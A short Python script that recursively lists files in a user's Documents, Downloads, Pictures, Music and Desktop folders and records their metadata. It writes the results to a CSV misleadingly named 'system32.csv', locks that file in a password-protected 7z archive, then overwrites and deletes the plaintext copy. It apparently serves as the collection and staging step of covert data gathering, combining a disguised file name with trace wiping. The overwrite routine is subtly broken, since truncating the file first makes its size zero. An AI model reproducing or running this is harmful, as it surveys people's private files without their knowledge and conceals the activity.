import datetime
import os
import csv
import time
import glob
import py7zr
import random

# Get home directory based on os
home = os.path.expanduser("~") + "/"

# Path to the file
path = home

# Convert time to ISO 8601 format
def iso_time(time2):
    iso = time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime(time2))
    return str(iso)

def getMetadata(path):
    # returns a tuple of the path, size, modified time, created time, accessed time, is file, is directory, is link, is mount, exists
    return path, os.path.getsize(path), iso_time(os.path.getmtime(path)), iso_time(os.path.getctime(path)), iso_time(os.path.getatime(path)), int(os.path.isfile(path)), int(os.path.isdir(path)), int(os.path.islink(path)), int(os.path.ismount(path))

# Recursively list files in home directory
def list_files(path):
    files_list = []

    for file in glob.glob(path + "**", recursive=True):
        files_list.append(file)

    return files_list


# Append files with list_files to path + folders in home directory
files = list_files(path + "Documents/")
print(type(files))
files.extend(list_files(path + "Downloads/"))
files.extend(list_files(path + "Pictures/"))
#files.extend(list_files(path + "Movies/"))
files.extend(list_files(path + "Music/"))
files.extend(list_files(path + "Desktop/"))


metadata = []
for file in files:
    metadata.append(getMetadata(file))

# Write code to push getMetadata to csv file.
with(open('system32.csv', 'w')) as csvfile:
    csvwriter = csv.writer(csvfile)
    csvwriter.writerow(['path', 'size', 'modified', 'created', 'accessed', 'is file', 'is directory', 'is link', 'is mount'])
    for meta in metadata:
        csvwriter.writerow(meta)

# Encrypt system32.csv with py7zr
with py7zr.SevenZipFile('system32.7z', 'w', password='HotzFellas') as archive:
    archive.writeall('system32.csv')

# Overwrite system32.csv with random data
with open('system32.csv', 'wb') as f:
    # Get size of file
    size = os.path.getsize('system32.csv')
    f.write(os.urandom(size + random.randrange(1,1024)))

# Delete system32.csv
os.remove('system32.csv')
